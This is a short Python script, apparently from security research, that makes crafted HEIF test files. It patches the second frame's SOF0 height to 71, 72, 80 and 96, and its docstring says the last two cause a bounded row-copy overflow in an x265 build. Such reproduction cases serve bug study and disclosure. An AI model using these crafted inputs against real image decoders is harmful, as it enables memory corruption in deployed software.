#!/usr/bin/env python3
"""W182: derive bounded second-frame heights from the W181 advisory-size file.

Frame 0's SOF stays 512x72 so x265 allocates a 36879-byte padding plane.
The second frame's SOF height varies: 71/72 do not trigger the reallocation
in this build, 80/96 do and produce a bounded row-copy overflow. Only SOF0
dimensions are patched; the entropy-coded samples are untouched.

Usage: make_short_overflow_sequence.py OUTPUT_DIR
"""
import hashlib
import importlib.util
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SPEC = importlib.util.spec_from_file_location("advisory", HERE / "make_advisory_size_sequence.py")
advisory = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(advisory)

EXPECTED = {
    "h71.heif": "2c3b8667400880bd844373134932598ffe47fcb91011ee92e1cfc5e84c7a2bbb",
    "h72.heif": "259a985b2ee466c0fba1262c83b3304ad26441ca0585fbfcb9c0888abb937ac9",
    "h80.heif": "2793a2123a8b80fb751aa74b9f827afe0e78a7393c14f4ffc171a316773cdac4",
    "h96.heif": "f92fc8e960acc828b51526ba634b3f0b829d62282a26a368745f4d8271eff56d",
}


def main():
    if len(sys.argv) != 2:
        raise SystemExit("usage: make_short_overflow_sequence.py OUTPUT_DIR")
    out_dir = Path(sys.argv[1])
    out_dir.mkdir(parents=True, exist_ok=True)
    data = advisory.REF.read_bytes()
    if hashlib.sha256(data).hexdigest() != advisory.REF_SHA:
        raise SystemExit("reference input changed")
    for height in (71, 72, 80, 96):
        out = advisory.patch(bytearray(data), ((72, 512), (height, 64)))
        name = f"h{height}.heif"
        digest = hashlib.sha256(out).hexdigest()
        if digest != EXPECTED[name]:
            raise SystemExit(f"{name}: unexpected sha256 {digest}")
        (out_dir / name).write_bytes(out)
        print(f"{name} sha256={digest} bytes={len(out)}")


if __name__ == "__main__":
    main()
